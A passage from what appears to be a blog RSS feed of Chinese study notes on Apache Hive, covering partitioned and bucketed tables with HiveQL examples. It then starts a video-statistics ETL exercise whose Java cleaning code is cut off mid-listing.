      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在查找大数据的时候，检索是通过检索所有数据，效率很慢，因此合理规划数据的存储尤其重要，例如可以根据日期进行分区存储（即分目录去存储）,或者使用分桶去切分数据文件进行存储。（注意这里说的分区和上篇的查找排序分区是不同的概念，上面的排序分区是存储好了去查找；这里的分区表是指在怎么分区去存储）</p><h1 id="1-分区表"><a href="#1-分区表" class="headerlink" title="1  分区表"></a>1  分区表</h1><p>分区表实际上就是对应一个HDFS文件系统上的独立的文件夹，该文件夹下是该分区所有的数据文件。<strong>Hive中的分区就是分目录，把一个大的数据集根据业务需要分割成小的数据集</strong>。在查询时通过WHERE子句中的表达式选择查询所需要的指定的分区，这样的查询效率会提高很多。</p><h2 id="1-1-分区表基本操作"><a href="#1-1-分区表基本操作" class="headerlink" title="1.1 分区表基本操作"></a>1.1 分区表基本操作</h2><p>1）引入分区表（需要根据日期对日志进行管理, 通过部门信息模拟）</p><pre><code>dept_20200401.logdept_20200402.logdept_20200403.log……</code></pre><p>2）创建分区表语法：通过partitioned去指定根据day字段去进行分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition<span class="token punctuation">(</span>deptno int, dname string, loc string<span class="token punctuation">)</span>partitioned by <span class="token punctuation">(</span>day string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）加载数据到分区表中</p><p>（1）      数据准备</p><pre class="line-numbers language-bash"><code class="language-bash">dept_20200401.log10 ACCOUNTING 170020 RESEARCH  1800dept_20200402.log30 SALES  190040 OPERATIONS 1700dept_20200403.log50 TEST  200060 DEV 1900<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）      加载数据-通过dept_partition partition(day=’20200402’)去指定导入的具体分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200401.log'</span> into table dept_partition partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200402.log'</span> into table dept_partition partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200402'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：分区表加载数据时，必须指定分区</p><p> Hdfs中文件如下：</p><p><img src="/2020/11/15/bigdata-hive3/1636982808531.png" alt="1636982808531"></p><p>4）查询分区表中数据</p><p>单分区查询-根据day去筛选</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>多分区联合查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span>​       union​       <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200402'</span>​       union​       <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200403'</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span> or​        day<span class="token operator">=</span><span class="token string">'20200402'</span> or day<span class="token operator">=</span><span class="token string">'20200403'</span> <span class="token punctuation">;</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）增加分区</p><p>创建单个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200404'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时创建多个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200405'</span><span class="token punctuation">)</span> partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200406'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）删除分区</p><p>删除单个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition drop partition <span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200406'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时删除多个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition drop partition <span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200404'</span><span class="token punctuation">)</span>, partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200405'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）查看分区表有多少分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show partitions dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）查看分区表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc formatted dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-二级分区"><a href="#1-2-二级分区" class="headerlink" title="1.2 二级分区"></a>1.2 二级分区</h3><p>思考: 如何一天的日志数据量也很大，如何再将数据拆分?</p><p>1）创建二级分区表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition2<span class="token punctuation">(</span>               deptno int, dname string, loc string               <span class="token punctuation">)</span>               partitioned by <span class="token punctuation">(</span>day string, hour string<span class="token punctuation">)</span>               row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  2）正常的加载数据</p><p>（1）加载数据到二级分区表中</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module`/hive/datas/dept_20200401.log'</span> into table dept_partition2 partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>, hour<span class="token operator">=</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查询分区数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'12'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）把数据直接上传到分区目录上，让分区表和数据产生关联的三种方式</p><p>（1）方式一：先上传数据，然后进行修复分区操作，可以查到数据</p><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>13<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/dept_20200401.log /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>13<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询数据（查询不到刚上传的数据）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'13'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行分区修复命令</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> msck repair table dept_partition2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'13'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）方式二：上传数据后，手动添加分区</p><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>14<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/hive/datas/dept_20200401.log /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>14<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行添加分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition2 add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>,hour<span class="token operator">=</span><span class="token string">'14'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'14'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）方式三：创建文件夹后，load数据到分区</p><p>创建目录</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>15<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200401.log'</span> into table dept_partition2 partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>,hour<span class="token operator">=</span><span class="token string">'15'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'15'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-动态分区"><a href="#1-3-动态分区" class="headerlink" title="1.3 动态分区"></a>1.3 动态分区</h3><p><strong>上面的分区都是我们手动去指定的，但是在实际应用中，对于大数据不可能每条都手动去分区，因此，Hive有个功能叫做动态分区</strong>。对比关系型数据库中，对分区表Insert数据时候，数据库自动会根据分区字段的值，将数据插入到相应的分区中，Hive中也提供了类似的机制，即动态分区(Dynamic Partition)，只不过，使用Hive的动态分区，需要进行相应的配置。</p><p>1） 开启动态分区参数设置**(3-6可以不改，使用默认值)**</p><p>（0）查看动态分区功能（默认true，开启）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.dynamic.partition<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）开启动态分区功能（默认true，开启）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.dynamic.partition<span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）设置为非严格模式（动态分区的模式，默认strict，表示必须指定至少一个分区为静态分区，nonstrict模式表示允许所有的分区字段都可以使用动态分区。）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.dynamic.partition.mode<span class="token operator">=</span>nonstrict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）在所有执行MR的节点上，最大一共可以创建多少个动态分区。默认1000</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.dynamic.partitions<span class="token operator">=</span>1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）在每个执行MR的节点上，最大可以创建多少个动态分区。该参数需要根据实际的数据来设定。比如：源数据中包含了一年的数据，即day字段有365个值，那么该参数就需要设置成大于365，如果使用默认值100，则会报错。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.dynamic.partitions.pernode<span class="token operator">=</span>100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）整个MR Job中，最大可以创建多少个HDFS文件。默认100000</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.created.files<span class="token operator">=</span>100000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）当有空分区生成时，是否抛出异常。一般不需要设置。默认false</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.error.on.empty.partition<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）案例实操</p><p><strong>需求：将dept表中的数据按照时间（day字段），插入到目标表dept_partition的相应分区中。</strong></p><p>（1）创建目标分区表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition_dy<span class="token punctuation">(</span>id int, name string,loc string<span class="token punctuation">)</span> partitioned by <span class="token punctuation">(</span>day string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）设置动态分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.dynamic.partition.mode <span class="token operator">=</span> nonstrict<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）      插入表数据</p><p><strong>方法1：导入本地数据到hive中</strong></p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive-3.4.2/datas/dept_partition_dy.txt'</span> into table dept_partition_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候可以发现 启动了mapreduce,因为用到了计算，这里需要注意的是，有可能会报错：找不到dept_partition_dy.txt文件，因为用到了计算，会启用yarn进行分配job，运行该job的不一定在当前机器hadoop102,也有可能在hadoop103。所以为了不出错，我们最好将数据先传到hdfs上，然后去load。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/dept_partition_dy.txt'</span> into table dept_partition_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法2：通过insert插入</p><p>因为低版本的load是不会启用mapreduce计算的，因此我们可以先将数据导入一个普通表，然后通过insert select查询操作将数据导入分区表中。</p><p>（a）先将数据导入普通表dept_dy</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive-3.4.2/datas/dept_partition_dy.txt'</span> into table dept_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（b）通过insert select查询操作将数据导入分区表dept_partition_dy中，因为insert操作会启用计算mapreduce</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert into dept_partition_dy <span class="token keyword">select</span> * from dept_by<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看目标分区表的分区情况和表数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition_dy<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> show partitions dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>思考：目标分区表是如何匹配到分区字段的？</p><p>要求插入的数据必须要有分区字段，即上面提到的day，这样才能根据数据文件中的day去匹配加入对应的分区。例如导入的文件为：</p><p>  <img src="/2020/11/15/bigdata-hive3/1636983103553.png" alt="1636983103553"></p><h1 id="2-分桶表"><a href="#2-分桶表" class="headerlink" title="2 分桶表"></a>2 分桶表</h1><p>分区提供一个隔离数据和优化查询的便利方式。不过，并非所有的数据集都可形成合理的分区。对于一张表或者分区，Hive 可以进一步组织成桶，也就是更为细粒度的数据范围划分。</p><p>分桶是将数据集分解成更容易管理的若干部分的另一个技术。</p><p><strong>分区针对的是数据的存储路径；分桶针对的是数据文件。</strong></p><h2 id="2-1-先创建分桶表"><a href="#2-1-先创建分桶表" class="headerlink" title="2.1 先创建分桶表"></a>2.1 先创建分桶表</h2><p>（1）数据准备</p><pre><code>1001  ss11002  ss21003  ss31004  ss41005  ss51006  ss61007  ss71008  ss81009  ss91010  ss101011  ss111012  ss121013  ss131014  ss141015  ss151016  ss16</code></pre><p>（2）创建分桶表—根据字段id去进行分桶，并且分4个桶</p><pre class="line-numbers language-bash"><code class="language-bash">create table stu_bucket<span class="token punctuation">(</span>id int, name string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> into 4 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（3）查看表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted stu_bucket<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）导入数据到分桶表中，load的方式</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath  <span class="token string">'/student.txt'</span> into table stu_bucket<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）查看创建的分桶表中是否分成4个桶</p><p>  <img src="/2020/11/15/bigdata-hive3/1636983158547.png" alt="1636983158547"></p><p>（6）查询分桶的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from stu_buck<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（7）分桶规则：</p><p>根据结果可知：Hive的分桶采用对分桶字段的值进行哈希，然后除以桶的个数求余的方 式决定该条记录存放在哪个桶当中</p><h2 id="2-2-分桶表操作需要注意的事项"><a href="#2-2-分桶表操作需要注意的事项" class="headerlink" title="2.2 分桶表操作需要注意的事项"></a>2.2 分桶表操作需要注意的事项</h2><p>（1）reduce的个数设置为-1,让Job自行决定需要用多少个reduce或者将reduce的个数设置为大于等于分桶表的桶数</p><p>（2）从hdfs中load数据到分桶表中，避免本地文件找不到问题</p><p>（3）不要使用本地模式</p><h2 id="2-3-insert方式将数据导入分桶表"><a href="#2-3-insert方式将数据导入分桶表" class="headerlink" title="2.3 insert方式将数据导入分桶表"></a>2.3 insert方式将数据导入分桶表</h2><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>insert into table stu_buck <span class="token keyword">select</span> * from student_insert <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（五） Hive实战</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-需求描述"><a href="#1-需求描述" class="headerlink" title="1 需求描述"></a>1 需求描述</h2><p>统计硅谷影音视频网站的常规指标，各种TopN指标：</p><p>– 统计视频观看数Top10</p><p>– 统计视频类别热度Top10</p><p>– 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数</p><p>– 统计视频观看数Top50所关联视频的所属类别Rank</p><p>– 统计每个类别中的视频热度Top10,以Music为例</p><p>– 统计每个类别视频观看数Top10</p><p>– 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频 </p><h2 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2 数据结构"></a>2 数据结构</h2><p>1）视频表</p><p>视频表</p><table><thead><tr><th>字段</th><th>备注</th><th>详细描述</th></tr></thead><tbody><tr><td>videoId</td><td>视频唯一id（String）</td><td>11位字符串</td></tr><tr><td>uploader</td><td>视频上传者（String）</td><td>上传视频的用户名String</td></tr><tr><td>age</td><td>视频年龄（int）</td><td>视频在平台上的整数天</td></tr><tr><td>category</td><td>视频类别（Array<String>）</String></td><td>上传视频指定的视频分类</td></tr><tr><td>length</td><td>视频长度（Int）</td><td>整形数字标识的视频长度</td></tr><tr><td>views</td><td>观看次数（Int）</td><td>视频被浏览的次数</td></tr><tr><td>rate</td><td>视频评分（Double）</td><td>满分5分</td></tr><tr><td>Ratings</td><td>流量（Int）</td><td>视频的流量，整型数字</td></tr><tr><td>conments</td><td>评论数（Int）</td><td>一个视频的整数评论数</td></tr><tr><td>relatedId</td><td>相关视频id（Array<String>）</String></td><td>相关视频的id，最多20个</td></tr></tbody></table><p>2）用户表</p><p>用户表</p><table><thead><tr><th>字段</th><th>备注</th><th>字段类型</th></tr></thead><tbody><tr><td>uploader</td><td>上传者用户名</td><td>string</td></tr><tr><td>videos</td><td>上传视频数</td><td>int</td></tr><tr><td>friends</td><td>朋友数量</td><td>int</td></tr></tbody></table><h2 id="3-准备工作"><a href="#3-准备工作" class="headerlink" title="3 准备工作"></a>3 准备工作</h2><h3 id="3-1-ETL"><a href="#3-1-ETL" class="headerlink" title="3.1 ETL"></a>3.1 ETL</h3><p><strong>ETL即数据预处理。</strong></p><p>原始数据一行展示：</p><pre class="line-numbers language-bash"><code class="language-bash">LKh7zAJ4nwo    TheReceptionist    653    People <span class="token operator">&amp;</span> Blogs    424    13021    4.34    1305    744    DjdA-5oKYFQ    NxTDlnOuybo    c-8VuICzXtU    DH56yrIO5nI    W1Uo5DQTtzc    E-3zXq_r4w0    1TCeoRPg5dE    yAr26YhuYNY    2ZgXx72XmoE    -7ClGo-YgZ0    vmdPOOd6cxI    KRHfMQqSHpk    pIMpORZthYw    1tUDzOp10pk    heqocRij5P0    _XIuvoH6rUg    LGVU5DsezE0    uO2kj6_D8B4    xiDqywcDQRM    uX81lMev6_o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过观察原始数据形式，可以发现，视频可以有多个所属分类，每个所属分类用&amp;符号分割，且分割的两边有空格字符，同时相关视频也是可以有多个元素，多个相关视频又用“\t”进行分割。为了分析数据时方便对存在多个子元素的数据进行操作，我们首先进行数据重组清洗操作。即：将所有的类别用“&amp;”分割，同时去掉两边空格，多个相关视频id也使用“&amp;”进行分割。</p><p>1）ETL之封装工具类:用于具体处理数据的工具</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ETLUtil</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   \* 数据清洗方法   */</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">etlData</span><span class="token punctuation">(</span>String srcData<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    StringBuffer resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//1. 先将数据通过\t 切割</span>​    String<span class="token punctuation">[</span><span class="token punctuation">]</span> datas <span class="token operator">=</span> srcData<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//2. 判断长度是否小于9</span>​    <span class="token keyword">if</span><span class="token punctuation">(</span>datas<span class="token punctuation">.</span>length <span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​      <span class="token keyword">return</span> null <span class="token punctuation">;</span>​    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//3. 将数据中的视频类别的空格去掉</span>​    datas<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>datas<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token comment" spellcheck="true">//4. 将数据中的关联视频id通过&amp;拼接</span>​    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> datas<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​      <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token comment" spellcheck="true">//4.1 没有关联视频的情况</span>​        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> datas<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token 